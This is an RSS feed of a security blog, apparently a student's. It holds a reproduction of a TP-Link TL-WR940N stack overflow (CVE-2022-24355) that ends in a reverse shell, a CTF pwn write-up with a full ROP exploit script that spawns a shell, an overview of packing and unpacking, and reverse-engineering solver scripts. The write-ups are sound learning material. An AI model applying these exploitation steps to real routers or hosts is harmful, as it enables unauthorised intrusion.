<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>All Posts - Cr0nica1</title>
        <link>https://cr0nica1.github.io/posts/</link>
        <description>All Posts | Cr0nica1</description>
        <generator>Hugo -- gohugo.io</generator><language>en-us</language><managingEditor>minhtoanlamson2005@gmail.com (cr0nica1)</managingEditor>
            <webMaster>minhtoanlamson2005@gmail.com (cr0nica1)</webMaster><lastBuildDate>Sat, 02 Aug 2025 20:56:05 &#43;0700</lastBuildDate><atom:link href="https://cr0nica1.github.io/posts/" rel="self" type="application/rss+xml" /><item>
    <title>Reproducing a Buffer Overflow RCE Vulnerability on TP-Link TL-WR940N (CVE-2022-24355)</title>
    <link>https://cr0nica1.github.io/posts/cve_2022_24355/</link>
    <pubDate>Sat, 02 Aug 2025 20:56:05 &#43;0700</pubDate>
    <author>cr0nica1</author>
    <guid>https://cr0nica1.github.io/posts/cve_2022_24355/</guid>
    <description><![CDATA[<h2 id="about-tp-link-tl-wr940n-and-the-vulnerability">About TP-Link TL-WR940N and the vulnerability</h2>
<p></p>
<p>The TP-Link TL-WR940N is a widely used wireless router known for its affordability and basic home networking features. In this article, i will reproduce CVE-2022-24355, a critical vulnerability on TL-WR940N firmware version 200316 and lower.
CVE-2022-24355 allows attackers to execute malicious code on affected installations of TP-Link TL-WR940N routers without requiring additional authentication. This vulnerability results from a user-supplied data mechanism: when parsing file extensions, this mechanism does not check the length of file name extensions. It copies them to a fixed-length stack-based buffer. An attacker can overwrite the return address and redirect the instruction pointer to a malicious shellcode.</p>
<h2 id="analyzing-the-vulnerability">Analyzing the vulnerability</h2>
<p>In this article, i use the TL-WR940N v4 firmware version 160617 to reproducing the exploitation of this vulnerability.</p>
<p></p>
<p>From main() function, httpd() function is called to initialize http service. This function deploys all the endpoints of the HTTP service like &lsquo;/&rsquo; , &lsquo;/userRpm/LoginRpm.htm&rsquo;, &lsquo;/help/&rsquo;,&hellip;. User must access the &lsquo;/fs/&rsquo; and &lsquo;/loginFs/&rsquo; endpoint to make the program call the httpRpmFs() function.</p>
<p></p>
<p>The Referer of request also must be equal to the host ip to pass the security check in httpDispatcher().</p>
<p></p>
<p>Analyzing httpRpmFs(), we easily show that this function is used to read the file content if the file name is in &lsquo;/tmp/&rsquo; or &lsquo;/web/&rsquo; folder of firmware.</p>
<p></p>
<p>Well, it looks good and does not seem vulnerable. I find and read blogs about analyzing this vulnerability (which I add to references). They said that it is vulnerable to reading &lsquo;passwd&rsquo; in &lsquo;/tmp/&rsquo; folder. The firmware 211111 fixed this vulnerability, so I am analyzing it to prove that it is vulnerable to reading files in &lsquo;/tmp/&rsquo;, specifically &lsquo;passwd&rsquo;.</p>
<p></p>
<p>A security check in firmware 211111 prevents us from reading files in &lsquo;/tmp/&rsquo; folder if we do not have authorized access. So, I try to read &lsquo;/tmp/passwd&rsquo;.</p>
<p></p>
<p></p>
<p>I attached a debugger to see why it crashed and saw that a part of the request was written on the stack and caused overflow.</p>
<p></p>
<p>The Return address value is overwritten by &lsquo;3456&rsquo;, which is from &ldquo;cookie: authorization: 123456&rdquo; of the request. A part of the request overwrites the return address, then causes httpd to crash.</p>
<p>Go back with httpRpmFs(), the program will make a response containing the content of the file we want to read in &lsquo;/tmp/&rsquo; folder after reading that file. Ensuring that the &lsquo;Content-Type&rsquo; of the response will match the file name extension of that file, sub_506790() is called to detect it.</p>
<p></p>
<p>This function creates a pointer that points to the end of the file path. Then, the pointer moves backward to find the &lsquo;.&rsquo; character, and copies the part of the string after &lsquo;.&rsquo; character. The program thinks that all content after &lsquo;.&rsquo; is a file extension. But in this case, &lsquo;/tmp/&rsquo; folder has a file &lsquo;passwd&rsquo;, which does not have a file extension. The pointer will move until it finds the first &lsquo;.&rsquo; character: the &lsquo;.&rsquo; of the IP address in the Referer header. All characters after this &lsquo;.&rsquo; are pushed to the stack. Then, the stack is overwritten. The return address value on the stack is overwritten, too, so the program crashes.</p>
<h2 id="reproducing-the-exploitation">Reproducing the exploitation</h2>
<p></p>
<p>From the checksec result, the program does not have any mitigation. In some blogs, they said that the router‚Äôs ASLR is disabled. So we can easily get the libc base address to build the ROP gadget. I will overwrite the return address to a ROP chain, then redirect to a shellcode.</p>
<p>I borrowed a shellcode from (<a href="https://www.exploit-db.com/exploits/35868" target="_blank" rel="noopener noreffer ">https://www.exploit-db.com/exploits/35868</a>) and ROPgadget from (<a href="https://www.exploit-db.com/exploits/46678" target="_blank" rel="noopener noreffer ">https://www.exploit-db.com/exploits/46678</a>) to craft the payload of my exploit code, but after sending the payload, I do not receive any connection from the router (which is a reverse shell). I reanalyze and find that the toupper() will uppercase all characters from &lsquo;a&rsquo; to &lsquo;z&rsquo;. My shellcode has many bytes from &lsquo;a&rsquo; to &lsquo;z&rsquo;.</p>
<p></p>
<p>I obfuscate my shellcode with xor.encoded from pwntools, but it still has an illegal byte.</p>
<p></p>
<p>After finding on the internet, I see that we can change all <code>$t6</code> in shellcode to <code>$t1</code>, because the shellcode and rop chain do not use this register, and ¬†<code>$t1</code> register has the same purpose as <code>$t6</code>.</p>
<p></p>
<p>And finally, I craft my payload and receive a reverse shell from the router.</p>
<p></p>
<p></p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://blog.viettelcybersecurity.com/tp-link-tl-wr940n-httpd-httprpmfs-stack-based-buffer-overflow-remote-code-execution-vulnerability/" target="_blank" rel="noopener noreffer ">https://blog.viettelcybersecurity.com/tp-link-tl-wr940n-httpd-httprpmfs-stack-based-buffer-overflow-remote-code-execution-vulnerability/</a></li>
<li><a href="https://flex0geek.blogspot.com/2024/04/debugexploit-cve-2022-24355-tp-link-tl.html" target="_blank" rel="noopener noreffer ">https://flex0geek.blogspot.com/2024/04/debugexploit-cve-2022-24355-tp-link-tl.html</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/581866861" target="_blank" rel="noopener noreffer ">https://zhuanlan.zhihu.com/p/581866861</a></li>
</ul>
]]></description>
</item>
<item>
    <title>Dreamhack CTF Season 7 Round #5 (üö©Div1)</title>
    <link>https://cr0nica1.github.io/posts/dhctf%237r5/</link>
    <pubDate>Wed, 16 Apr 2025 03:57:40 &#43;0700</pubDate>
    <author>cr0nica1</author>
    <guid>https://cr0nica1.github.io/posts/dhctf%237r5/</guid>
    <description><![CDATA[<p>Gi·∫£i n√†y di·ªÖn ra t√¨nh c·ªù v√†o th·ªùi ƒëi·ªÉm m√¨nh v·ª´a xong ƒë·ª£t trainning CTF n√™n c√≥ th·ªùi gian r·∫£nh th·ª≠ s·ª©c. Tuy nhi√™n b·∫±ng m·ªôt c√°ch th·∫ßn k·ª≥ n√†o ƒë√≥ m√¨nh l·ª° b√†i rev kh√° ti·∫øc m√† gi·∫£i ƒë∆∞·ª£c c√¢u pwn n√†y.</p>
<h2 id="chat-with-me---binary-exploitation">Chat with Me - Binary exploitation</h2>
<h3 id="i-vulnerability">I. Vulnerability</h3>
<p></p>
<p></p>
<p>Checksec v√† ƒë·ªçc Pseudocode trong IDA c√≥ NX, kh√¥ng c√≥ PIE v√† canary v√† c√≥ m·ªôt l·ªói buffer overflow:</p>
<pre tabindex="0"><code>_QWORD buf[97];
memset(buf, 0, 0x300uLL);
v12 = read(v13, buf, 0x600uLL);
</code></pre><p>Do ch∆∞∆°ng tr√¨nh c√≥ NX, v√¨ v·∫≠y h∆∞·ªõng ti·∫øp c·∫≠n s·∫Ω kh√¥ng ph·∫£i l√† ret2shellcode.</p>
<h3 id="ii-exploitation">II. Exploitation</h3>
<p>Ch∆∞∆°ng tr√¨nh s·ª≠ d·ª•ng nhi·ªÅu h√†m g·ªçi t·ª´ libc tr∆∞·ªõc khi y√™u c·∫ßu nh·∫≠p v√†o b·ªô ƒë·ªám, ƒë·ªìng th·ªùi cho nh·∫≠p t·∫≠n 0x600 byte. Do v·∫≠y √Ω t∆∞·ªüng s·∫Ω l√† leak gi√° tr·ªã t·ª´ b·∫£ng GOT v√† t√¨m libc_base. ƒê·ªçc trong stack tr√™n IDA, c·∫ßn ph·∫£i padding 840 byte th√¨ ch√∫ng ta s·∫Ω ƒë·∫øn ret_address, th·ª≠ nh·∫≠p 848 byte ƒë·ªÉ ki·ªÉm tra trong GDB:</p>
<p></p>
<p>Nh∆∞ v·∫≠y l√† ch√∫ng ta ƒë√£ ghi ƒë√® ƒë∆∞·ª£c, ti·∫øp ƒë·∫øn ch√∫ng ta c·∫ßn t√¨m c√°c gadget ƒë·ªÉ g·ªçi h√†m read, bi·∫øt r·∫±ng fd c·ªßa ch√∫ng ta l√† 4.</p>
<p></p>
<p>C√≥ s·∫µn m·ªôt gadget r·∫•t ƒë·∫πp ·ªü ƒë√¢y. Tuy nhi√™n ·ªü ƒë√¢y th√¨ m√¨nh s·ª£ r·∫±ng vi·ªác overflow s·∫Ω khi·∫øn m·ªôt v√†i h√†m ƒë·∫∑c bi·ªát ki·ªÉm tra t√¨nh tr·∫°ng k·∫øt n·ªëi l√†m m·∫•t connection n√™n ƒë·ªÉ an to√†n m√¨nh stack pivot sang m·ªôt v√πng c√≥ quy·ªÅn rw, v√† do c≈©ng kh√¥ng c√≥ PIE n√™n m√¨nh d·ªÖ d√†ng b·ªï sung v√†o payload c√°c gadget ƒë·ªÉ stack pivot v√† th·ª±c hi·ªÉn read m·ªôt l·∫ßn n·ªØa. M√¨nh t√¨m th√™m gadget pop_rbp v√† gadget leave_ret. Payload ƒë·∫ßu ti√™n ƒë·ªÉ leak libc_base v√† y√™u c·∫ßu h√†m read th√™m 1 l·∫ßn n·ªØa.</p>
<pre tabindex="0"><code>payload=b&#39;A&#39;*840
payload+=p64(gadget)+p64(0)+p64(0x8)+p64(elf.got[&#39;puts&#39;])+p64(4)
payload+=p64(elf.plt[&#39;send&#39;])
payload+=p64(pop_rbp)+p64(0x404900)
payload+=p64(gadget+1)+p64(0x300)+p64(0x404900)+p64(4)
payload+=p64(elf.plt[&#39;read&#39;])+p64(leave_ret)
</code></pre><p>B√¨nh th∆∞·ªùng th√¨ ƒë·∫øn ƒë√¢y s·∫Ω kh√° ƒë∆°n gi·∫£n v√¨ payload th·ª© 2 l√† g·ªçi system(&rsquo;/bin/sh&rsquo;). Tuy nhi√™n ƒëi·ªÅu ph·ª©c t·∫°p ·ªü ƒë√¢y l√† fd c·ªßa ch√∫ng ta l√† 4, c√≤n shell t∆∞∆°ng t√°c v·ªõi stdin v√† stdout ·ªü fd=0 v√† fd=1. Ch√∫ng ta c·∫ßn √©p n√≥ v·ªÅ fd=4:</p>
<pre tabindex="0"><code>dup2(4,0);
dup2(4,1);
</code></pre><h3 id="iii-script">III. Script</h3>
<pre tabindex="0"><code>from pwn import *
context.binary=elf=ELF(&#39;./chall&#39;,checksec=False)
libc=ELF(&#39;./libc.so.6&#39;,checksec=False)
gadget=0x0000000000401396
pop_rbp=0x40137d
push_rsp=0x207768
leave_ret=0x4016ca

p=remote(&#39;host3.dreamhack.games&#39;,20267)
p.recvuntil(b&#39;Welcome to the TCP Chat Server!\n&#39;)

payload=b&#39;A&#39;*840
payload+=p64(gadget)+p64(0)+p64(0x8)+p64(elf.got[&#39;puts&#39;])+p64(4)
payload+=p64(elf.plt[&#39;send&#39;])
payload+=p64(pop_rbp)+p64(0x404900)
payload+=p64(gadget+1)+p64(0x300)+p64(0x404900)+p64(4)
payload+=p64(elf.plt[&#39;read&#39;])+p64(leave_ret)
p.send(payload)

leak=u64(p.recvn(8))
log.info(f&#39;leak: {hex(leak)}&#39;)
lib_base=leak-libc.sym[&#39;puts&#39;]
lib_system=lib_base+libc.sym[&#39;system&#39;]
log.info(f&#39;lib base: {hex(lib_base)}&#39;)

payload=p64(0)+p64(gadget+2)+p64(0)+p64(4)+p64(libc.sym[&#39;dup2&#39;]+lib_base)
payload+=p64(gadget+2)+p64(1)+p64(4)+p64(libc.sym[&#39;dup2&#39;]+lib_base)
payload+=p64(gadget+3)+p64(lib_base+next(libc.search(b&#39;/bin/sh&#39;)))+p64(gadget+4)+p64(lib_system)

p.send(payload)
p.interactive()
</code></pre><h1 id="iv-reference">IV. Reference</h1>
<p><a href="https://dreamhack.io/ctf/659" target="_blank" rel="noopener noreffer ">https://dreamhack.io/ctf/659</a></p>
]]></description>
</item>
<item>
    <title>Research: Packing v√† Unpacking trong reverse engineering</title>
    <link>https://cr0nica1.github.io/posts/research/</link>
    <pubDate>Wed, 16 Apr 2025 03:43:12 &#43;0700</pubDate>
    <author>cr0nica1</author>
    <guid>https://cr0nica1.github.io/posts/research/</guid>
    <description><![CDATA[<blockquote>
<p>SLIDE b√†i thuy·∫øt tr√¨nh: <a href="https://www.canva.com/design/DAGiMR6Qp0U/OkIupXHYFkij3xmruojTrQ/edit?utm_content=DAGiMR6Qp0U&amp;utm_campaign=designshare&amp;utm_medium=link2&amp;utm_source=sharebutton" target="_blank" rel="noopener noreffer ">https://www.canva.com/design/DAGiMR6Qp0U/OkIupXHYFkij3xmruojTrQ/edit?utm_content=DAGiMR6Qp0U&utm_campaign=designshare&utm_medium=link2&utm_source=sharebutton</a></p></blockquote>
<p>Packing l√† m·ªôt trong nh·ªØng k·ªπ thu·∫≠t c∆° b·∫£n v·ªÅ b·∫£o v·ªá file. ƒê·ªëi v·ªõi c√°c reverser, unpacking l√† c√¥ng c·ª• ƒë·∫Øc l·ª±c ƒë·ªÉ v∆∞·ª£t qua k·ªπ thu·∫≠t anti-reverse kh√° m·∫°nh m·∫Ω n√†y. H·∫ßu h·∫øt m·ªçi th·ª© v·ªÅ ph∆∞∆°ng ph√°p ph√¢n t√≠ch th√¨ ƒë·ªÅu c√≥ ·ªü trong slide tr√™n, b√†i vi·∫øt n√†y c·ªßa m√¨nh s·∫Ω ch·ªâ t√≥m t·∫Øt l·∫°i √Ω ch√≠nh t·ª´ b√†i thuy·∫øt tr√¨nh.</p>
<h2 id="1-t·ªïng-quan-v·ªÅ-packing-v√†-unpacking">1. T·ªïng quan v·ªÅ packing v√† unpacking.</h2>
<ul>
<li>Packing: Vi·ªác n√©n, che gi·∫•u m√£ th·ª±c thi g·ªëc c·ªßa ch∆∞∆°ng tr√¨nh.</li>
<li>Packer: Ch∆∞∆°ng tr√¨nh packing file th·ª±c thi nh·∫±m che gi·∫•u m√£ th·ª±c thi g·ªëc.</li>
</ul>
<p>Packed File:</p>
<ul>
<li>File th·ª±c thi m√† m√£ th·ª±c thi g·ªëc ƒë√£ b·ªã pack b·ªüi packer - nghƒ©a l√† m√£ th·ª±c thi g·ªëc ƒë√£ b·ªã ·∫©n ƒëi khi load v√†o c√°c tr√¨nh disassembler ƒë·ªÉ
ph√¢n t√≠ch v√† l∆∞u l·∫°i.</li>
<li>ƒê∆∞·ª£c packing b·∫±ng c√°c k·ªπ thu·∫≠t nh∆∞ n√©n, m√£ h√≥a, t·ª± ƒë·ªông b·ªï sung m·ªôt ho·∫∑c nhi·ªÅu section v√† ƒëo·∫°n unpacking stub, cu·ªëi c√πng l√† packed data. M√£ th·ª±c thi g·ªëc c·ªßa ch∆∞∆°ng tr√¨nh n·∫±m trong packed data.</li>
</ul>
<p>M·ª•c ƒë√≠ch c·ªßa vi·ªác pack c√°c file th·ª±c thi: Nh∆∞ c√°c k·ªπ thu·∫≠t obfuscating kh√°c, vi·ªác pack file th·ª±c thi nh·∫±m g√¢y kh√≥ khƒÉn h∆°n ƒë·ªëi v·ªõi c√°c reverser trong vi·ªác ph√¢n t√≠ch v√† ƒë·∫£o ng∆∞·ª£c ch∆∞∆°ng tr√¨nh.ƒê·ªëi v·ªõi malware, vi·ªác pack file khi·∫øn cho c√°c tr√¨nh Anti-virus (AV) kh√≥ khƒÉn trong vi·ªác x√°c ƒë·ªãnh n√≥. C√°c AV th√¥ng th∆∞·ªùng s·∫Ω qu√©t tuy·∫øn t√≠nh file PE t·ª´ ƒë·∫ßu ƒë·∫øn cu·ªëi c·ªßa file theo c·∫•u tr√∫c file. Tuy nhi√™n vi·ªác pack ƒë√£ ch√®n th√™m nhi·ªÅu section &lsquo;&lsquo;r√°c&rsquo;&rsquo;, c√°c section r√°c n√†y b·ªã AV nh·∫≠n di·ªán l√† v√¥ h·∫°i. M√£ th·ª±c thi g·ªëc c√≥ h·∫°i l·∫°i n·∫±m b√™n trong Packed Data. D·ªØ li·ªáu b√™n trong Packed Data ch·ªâ b·ªã gi·∫£i n√©n khi ch∆∞∆°ng tr√¨nh ƒë∆∞·ª£c kh·ªüi ch·∫°y (runtime).</p>
<h2 id="2-nguy√™n-l√Ω-ho·∫°t-ƒë·ªông-c·ªßa-packing">2. Nguy√™n l√Ω ho·∫°t ƒë·ªông c·ªßa packing</h2>
<ul>
<li>Khi file b·ªã packed, c√°c gi√° tr·ªã b√™n trong c√°c section s·∫Ω b·ªã n√©n, m√£ h√≥a ƒë·ªÉ che gi·∫•u kh·ªèi reverser.</li>
<li>Packer s·∫Ω th√™m c√°c unpacking stub v√† c√°c section r√°c v√†o. C√°c unpacking stub s·∫Ω kh√¥i ph·ª•c l·∫°i m√£ th·ª±c thi g·ªëc, tr·∫°ng th√°i c√°c thanh ghi v√† d·∫´n lu·ªìng ch∆∞∆°ng tr√¨nh ƒë·∫øn Original entry point c·ªßa ph·∫ßn m√£ th·ª±c thi ƒë√≥.</li>
<li>Khi ch∆∞∆°ng tr√¨nh th·ª±c thi, sau khi load xong h·∫øt c√°c ph·∫ßn ·ªü tr√™n th√¨ Instruction Pointer s·∫Ω nh·∫£y ƒë·∫øn entry point c·ªßa ch∆∞∆°ng tr√¨nh n·∫±m trong Unpacking stub. C√°c unpacking stub n√†y c√≥ nhi·ªám v·ª• kh√¥i ph·ª•c l·∫°i m√£ th·ª±c thi g·ªëc, kh√¥i ph·ª•c l·∫°i tr·∫°ng th√°i c√°c thanh ghi. Sau khi gi·∫£i m√£/ gi·∫£i n√©n m√£ th·ª±c thi g·ªëc xong, trong unpacking stub s·∫Ω c√≥ l·ªánh chuy·ªÉn h∆∞·ªõng v√†o original entry point (OEP) c·ªßa ƒëo·∫°n m√£ th·ª±c thi ƒë∆∞·ª£c gi·∫£i n√©n.</li>
<li>Sau ƒë√≥, ch∆∞∆°ng tr√¨nh nh·∫£y ƒë·∫øn Original Entry Point c·ªßa v√πng m√£ ƒë∆∞·ª£c gi·∫£i n√©n, kh√¥i ph·ª•c gi√° tr·ªã c√°c thanh ghi (n·∫øu c√≥) v√† th·ª±c thi ch∆∞∆°ng tr√¨nh nh∆∞ b√¨nh th∆∞·ªùng.</li>
</ul>
<h2 id="3-ph∆∞∆°ng-ph√°p-ph√¢n-t√≠ch-v√†-unpack-file-b·ªã-n√©n">3. Ph∆∞∆°ng ph√°p ph√¢n t√≠ch v√† unpack file b·ªã n√©n</h2>
<blockquote>
<p>N·ªôi dung ph·∫ßn n√†y v√† to√†n b·ªô Demo m√¨nh ƒë√£ tr√¨nh b√†y r√µ trong slide b√™n tr√™n.</p></blockquote>
]]></description>
</item>
<item>
    <title>squ1rrel CTF 2025</title>
    <link>https://cr0nica1.github.io/posts/squirrel/</link>
    <pubDate>Wed, 16 Apr 2025 03:39:19 &#43;0700</pubDate>
    <author>cr0nica1</author>
    <guid>https://cr0nica1.github.io/posts/squirrel/</guid>
    <description><![CDATA[<p>squ1rrel l√† m·ªôt gi·∫£i kh√° √≠t challenge rev, ch·ªâ c√≥ 3 b√†i. M√¨nh tham gia gi·∫£i n√†y song song Breach n√™n c≈©ng ch·ªâ k·ªãp ƒë√≥ng g√≥p cho team 1 b√†i.</p>
<h2 id="intermediate-software-design---reverse-engineering">Intermediate Software Design - reverse engineering</h2>
<h3 id="1-static-analysis">1. Static Analysis</h3>
<p>Ch∆∞∆°ng tr√¨nh ch·ªâ g·ªìm c√≥ duy nh·∫•t 1 h√†m main, nh·∫≠n input v√† x·ª≠ l√Ω n√≥. Logic x·ª≠ l√Ω c·ªßa ch∆∞∆°ng tr√¨nh l·∫°i kh√¥ng qu√° ph·ª©c t·∫°p, n√≥ ch·ªß y·∫øu n·∫±m ·ªü ƒëo·∫°n sau.</p>
<p></p>
<p>C√≥ m·ªôt l∆∞u √Ω nh·ªè ·ªü ƒë√¢y, ch∆∞∆°ng tr√¨nh ƒë·ªçc input th√†nh m·ªôt m·∫£ng c√°c k√Ω t·ª±, m·ªói k√Ω t·ª± l√† 4 byte. ·ªû v√≤ng l·∫∑p ƒë·∫ßu ti√™n, con tr·ªè v3 di chuy·ªÉn d·ªçc theo m·∫£ng k√Ω t·ª± input, r·ªìi l·∫•y k·∫øt qu·∫£ th·ª±c hi·ªán xor v·ªõi k·∫øt qu·∫£ trong &amp;v23.Tuy nhi√™n, con tr·ªè v3 l·∫°i l√† con tr·ªè (_DWORD), m√† m·∫£ng k√Ω t·ª± ƒë·ªçc v√†o l√† c√°c m·∫£ng k√Ω t·ª± 4 byte n√™n ph√©p xor n√†y ch·ªâ ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c k√Ω t·ª± l·∫ª. Ch√∫ng ta c√≥ th·ªÉ th·∫•y r√µ nh∆∞ sau.</p>
<p></p>
<p></p>
<p>Nh∆∞ v·∫≠y sau loop th·ª© nh·∫•t s·∫Ω th·ª±c hi·ªán ph√©p xor gi·ªØa c√°c ph·∫ßn t·ª≠ l·∫ª c·ªßa chu·ªói v√† constant t·∫°i &amp;v23.</p>
<p>·ªû v√≤ng l·∫∑p th·ª© 2, ch∆∞∆°ng tr√¨nh l·∫∑p qua string sau khi b·ªã bi·∫øn ƒë·ªïi v√† th·ª±c hi·ªán ph√©p to√°n vs c√°c constant ƒë∆∞·ª£c l∆∞u s·∫µn.</p>
<p></p>
<p>C√≥ m·ªôt ƒëi·ªÅu ƒë√°ng l∆∞u √Ω l√† v13 l√† b·ªô ƒë·∫øm ƒë·ªÉ l·∫•y gi√° tr·ªã t·∫°i v21, tuy nhi√™n v13 c≈©ng ch√≠nh l√† b·ªô ƒë·∫øm ·ªü v√≤ng l·∫∑p tr√™n v√† n√≥ kh√¥ng h·ªÅ ƒë·∫∑t l·∫°i v·ªÅ 0 khi v√†o v√≤ng l·∫∑p n√†y n√™n v13 s·∫Ω b·∫Øt ƒë·∫ßu t·ª´ s·ªë ph·∫ßn t·ª≠ l·∫ª c·ªßa input.</p>
<p>T·ª´ ph√¢n t√≠ch tr√™n, ta ch·ªâ c·∫ßn l·∫•y constant c·∫ßn thi·∫øt v√†o v√† vi·∫øt script reverse l·∫°i l√† xong.</p>
<h3 id="2-reversing">2. Reversing</h3>
<p></p>
<p>Output ch·ª©a k√Ω t·ª± kh√¥ng in ƒë∆∞·ª£c n√™n m√¨nh s·∫Ω l·∫•y gi√° tr·ªã hex ·ªü ƒë√¢y. ƒê·ªìng th·ªùi d·ªÖ nh·∫≠n th·∫•y output c√≥ ƒë·ªô d√†i l√† 26 n√™n v13 s·∫Ω b·∫Øt ƒë·∫ßu t·ª´ v·ªã tr√≠ 13 ·ªü v√≤ng l·∫∑p th·ª© 2. M√¨nh ch·∫°y script reverse v√† thu ƒë∆∞·ª£c.</p>
<p></p>
<h3 id="3-script">3. Script</h3>
<pre tabindex="0"><code>v21=[3, 3, 1, 5, 50, 8, 1, 9,
 5, 7, 9, 3, 2, 2, 6, 8,
 5, 30, 6, 3, 3, 1, 5, 4,
 8, 1, 9, 5, 7, 2, 3, 2,
 2, 6, 8, 5, 4, 6, 3, 3,
 1, 5, 4, 8, 1, 9, 5, 7,
 9, 3, 2, 2, 6, 8, 5, 4,
 6, 3, 3, 1, 5, 4, 8, 1,
 9, 5, 7, 9, 3, 2, 2, 6,
 8, 5, 4, 6]

n=[0x2a,0x51,0x63,0x4d,0x22,0x5c,0x37,0x7e,0x00]

output=&#39;\x59\x75\x2a\x34\x2d\x76\x29\x6d\x58\x7a\x6a\x7a\x73\x6f\x24\x7e\x30\x76\x58\x5f\x26\x5a\x09\x72\x42\x7e&#39;
print(len(output))
res=[]
for i in range(len(output)):
    res.append(ord(output[i])-v21[i+13]+2)
c=[]
for i in range(len(res)):
    if i%2==0:
        c.append(res[i]^n[(i//2)%9])
    else:
        c.append(res[i])
m=&#39;&#39;
for i in c:
    m+=chr(i)
print(m)
</code></pre>]]></description>
</item>
<item>
    <title>Breach CTF 2025</title>
    <link>https://cr0nica1.github.io/posts/breach/</link>
    <pubDate>Wed, 16 Apr 2025 03:30:40 &#43;0700</pubDate>
    <author>cr0nica1</author>
    <guid>https://cr0nica1.github.io/posts/breach/</guid>
    <description><![CDATA[<p>Breach c√≥ l·∫Ω l√† gi·∫£i kh√° kh√≥ ch·ªãu v·ªõi m√¨nh v√¨ kh√¥ng c√≥ nhi·ªÅu chall thu·∫ßn v·ªÅ reversing logic v√† x√°c ƒë·ªãnh lu·ªìng truy·ªÅn th·ªëng, m·∫∑t kh√°c n√≥ l·∫°i c√≥ ph·∫ßn tricky ·ªü nhi·ªÅu chall. ·ªû gi·∫£i n√†y ch·ªâ c√≥ m√¨nh m√¨nh gi·∫£i 1 chall.</p>
<h2 id="fraction-fun---rev">Fraction Fun - rev</h2>
<h3 id="1-analysis">1. Analysis</h3>
<p>Chall cho bi·∫øt file m√£ ngu·ªìn c·ªßa ch∆∞∆°ng tr√¨nh x√°c th·ª±c tr√™n server. C·∫ßn ph·∫£i nh·∫≠p ch√≠nh x√°c s·ªë c·∫ßn nh·∫≠p ƒë·ªÉ sau c√°c ph√©p bi·∫øn ƒë·ªïi, k·∫øt qu·∫£ s·∫Ω b·∫±ng k·∫øt qu·∫£ trong output.txt. Logic ch∆∞∆°ng tr√¨nh kh√° ƒë∆°n gi·∫£n, ch·ªâ l√† v√≤ng l·∫∑p sau.</p>
<pre tabindex="0"><code>for _ in range(1000):
    changed = False
    for i in range(len(a)):
        if inp % b[i] == 0:
            inp = inp * a[i] // b[i]
            changed = True
    if not changed:
        broken = True
        break
</code></pre><p>ƒê·ªëi v·ªõi ƒëo·∫°n logic ƒë∆°n gi·∫£n n√†y, ch√∫ng ta ch·ªâ ƒë∆°n gi·∫£n l√† vi·∫øt script ƒë·∫£o ng∆∞·ª£c ph√©p logic n√†y l√† ƒë∆∞·ª£c.</p>
<h3 id="2-reversing">2. Reversing</h3>
<p>ƒêo·∫°n m√£ ƒë·∫£o ng∆∞·ª£c logic d·ªÖ d√†ng ƒë·∫°t ƒë∆∞·ª£c b·∫±ng c√°ch th·ª±c hi·ªán ng∆∞·ª£c l·∫°i c√°c ph√©p to√°n bi·∫øn ƒë·ªïi tr√™n:</p>
<pre tabindex="0"><code>for _ in range(1000):
        changed = False
        
        for i in reversed(range(len(a))):
            ai = a[i]
            bi = b[i]
            if current % ai == 0:
                current = current * bi // ai
                changed = True
        if not changed:
            broken = True
            break
</code></pre><p>S·ª≠ d·ª•ng ƒëo·∫°n m√£ n√†y v√†o script thu ƒë∆∞·ª£c.</p>
<p></p>
<p>Nh·∫≠p v√†o v√† l·∫•y flag.</p>
<p></p>
<h3 id="3-script">3. Script</h3>
<pre tabindex="0"><code>def reverse_execute(code, fin_output):
    values = code.split(&#34; &#34;)
    a = [int(i.split(&#34;/&#34;)[0]) for i in values]
    b = [int(i.split(&#34;/&#34;)[1]) for i in values]
    current = fin_output
    broken = False
    for _ in range(1000):
        changed = False
        
        for i in reversed(range(len(a))):
            ai = a[i]
            bi = b[i]
            if current % ai == 0:
                current = current * bi // ai
                changed = True
        if not changed:
            broken = True
            break
    if not broken:
        print(&#34;Reverse loop did not terminate in 1000 iterations!&#34;)
    return current

code = open(&#34;code.txt&#34;, &#34;r&#34;).read().strip()
fin_output = int(open(&#34;output.txt&#34;, &#34;r&#34;).read().strip())

required_input = reverse_execute(code, fin_output)
print(required_input)
</code></pre>]]></description>
</item>
<item>
    <title>Hackthebox: Cyber Apocalypse CTF 2025: Tales from Eldoria</title>
    <link>https://cr0nica1.github.io/posts/htb/</link>
    <pubDate>Wed, 16 Apr 2025 03:10:02 &#43;0700</pubDate>
    <author>cr0nica1</author>
    <guid>https://cr0nica1.github.io/posts/htb/</guid>
    <description><![CDATA[<p>Nh∆∞ m·ªçi khi, hackthebox lu√¥n mang ƒë·∫øn cho ch√∫ng ta gi·∫£i CTF kh√° ch·∫•t l∆∞·ª£ng v·ªÅ ƒë·ªô ph√¢n lo·∫°i, ph√π h·ª£p cho c·∫£ beginner v√† ng∆∞·ªùi ƒë√£ c√≥ kinh nghi·ªám. ·ªû gi·∫£i n√†y nh·ªØng challenge easy v√† very easy ƒë·ªÅu qu√° d·ªÖ n√™n m√¨nh s·∫Ω ch·ªâ vi·∫øt writeup challenge m·ª©c ƒë·ªô medium m√¨nh gi·∫£i ƒë∆∞·ª£c.</p>
<h1 id="writeup">Writeup</h1>
<h2 id="singlestep---rev">Singlestep - rev</h2>
<h3 id="1-static-analysis">1. Static Analysis</h3>
<p>Load file v√†o IDA, ch√∫ng ta nh·∫≠n th·∫•y h√†m h√†m main call ƒë·∫øn m·ªôt h√†m loc_5555555583E0 n√†o ƒë·∫•y. V√†o trong h√†m b√™n trong h√†m n√†y ki·ªÉm tra.</p>
<p></p>
